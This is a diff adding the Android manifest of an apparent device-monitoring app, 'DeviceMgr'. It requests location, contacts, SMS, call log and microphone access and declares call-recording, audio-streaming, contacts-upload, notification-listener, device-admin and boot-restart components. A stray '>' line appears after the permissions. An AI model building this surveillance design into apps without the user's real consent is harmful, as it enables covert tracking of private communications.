@@ -1,0 +1,100 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.company.devicemgr" >
+
+    <!-- permissões -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <!-- pedido para ver estatísticas de utilização (deve ser concedido pelo utilizador em Settings) -->
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
+>
+    <application
+        android:allowBackup="true"
+        android:label="DeviceMgr"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.MyApplication" >
+
+        <!-- Launcher (entry) activity -->
+        <activity
+            android:name="com.company.devicemgr.activities.LoginActivity"
+            android:exported="true" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Permissões / onboarding / settings -->
+        <activity
+            android:name="com.company.devicemgr.activities.MainPermissionsActivity"
+            android:exported="false" />
+        <activity
+            android:name="com.company.devicemgr.activities.ConsentActivity"
+            android:exported="false" />
+
+        <!-- Serviços -->
+        <!-- Telemetry: foreground service (location) -->
+        <service
+            android:name="com.company.devicemgr.services.ForegroundTelemetryService"
+            android:exported="false"
+            android:foregroundServiceType="location" />
+
+        <!-- Contacts uploader (short lived) -->
+        <service
+            android:name="com.company.devicemgr.services.ContactsUploaderService"
+            android:exported="false" />
+
+        <!-- Call recorder (may require foreground start and RECORD_AUDIO) -->
+        <service
+            android:name="com.company.devicemgr.services.CallRecorderService"
+            android:exported="false"
+            android:foregroundServiceType="microphone" />
+<service
+android:name="com.company.devicemgr.services.StreamingService"
+android:exported="false"
+android:foregroundServiceType="microphone" />
+        <!-- Notification listener service (user must enable it in settings) -->
+        <service
+            android:name="com.company.devicemgr.services.NotificationListenerSvc"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- Device admin receiver -->
+        <receiver
+            android:name="com.company.devicemgr.receivers.DeviceAdminReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN" >
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_receiver" />
+
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Boot receiver (reinicia serviços se consentidos) -->
+        <receiver
+            android:name="com.company.devicemgr.receivers.BootReceiver"
+            android:exported="true" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+    </application>
+
+</manifest>
